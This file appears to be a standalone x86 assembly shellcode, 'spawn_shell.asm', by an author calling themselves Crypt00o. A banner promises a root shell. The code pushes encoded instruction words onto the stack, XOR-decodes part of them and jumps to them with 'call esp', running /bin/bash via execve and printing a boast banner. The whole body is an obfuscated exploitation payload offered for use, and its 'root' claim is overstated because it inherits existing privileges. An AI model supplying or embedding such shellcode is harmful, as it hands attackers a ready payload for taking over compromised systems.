;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;          spawn_shell.asm                                         ;
;   [+] Hello Iam Crypt00o #                                       ;
; if you run this code you will get :                              ;
;                                                                  ;
;                                                                  ;
; [+] 0xCrypt00o Going To Spawn A Root Shell                       ;
; root@kali:~#                                                     ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

xor dword[esp],0x12345678
 push 0x01b0d231
 push 0xc931db31
 push 0xc03180cd
 push 0x0bb0e389
 push 0x12345678
 push 0x08247481
 push 0x6e69622f
 push 0x68736162
 push 0x2f681234
 push 0x56106850
 push 0xd231c931
 push 0xdb31c031
 push 0x80cd04b0
 push 0xe1892db2
 push 0x205d2b5b
 push 0x68724378
 push 0x30683074
 push 0x70796847
 push 0x206f3068
 push 0x676e696f
 push 0x68206f54
 push 0x20687761
 push 0x70536820
 push 0x41206e68
 push 0x756e694c
 push 0x68685320
 push 0x78680a6c
 push 0x6c656850
 push 0xffe48320
 push 0xec83e589
 push 0xd231c931
 push 0xdb31c031
 call esp
